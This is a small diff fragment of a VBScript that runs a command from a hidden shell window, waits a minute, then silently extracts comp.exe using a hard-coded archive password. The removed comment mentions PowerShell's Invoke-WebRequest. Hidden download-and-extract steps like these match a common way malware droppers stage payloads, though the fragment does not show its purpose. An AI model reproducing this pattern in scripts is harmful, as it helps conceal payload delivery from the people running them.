@@ -9,7 +9,6 @@ psCmd1p4 = " "+fldr+"\comp.exe"+chr(34)
 Set shl = CreateObject("WScript.Shell")
 shl.Run psCmd1p1+psCmd1p2+psCmd1p3+psCmd1p4, 0
 WScript.Sleep 60000 '1min
-'cmd ps: Invoke-WebRequest
 
 psCmd1p1 = fldr+"\comp.exe"
 psCmd1p2 = " -pPMC2025 -y"
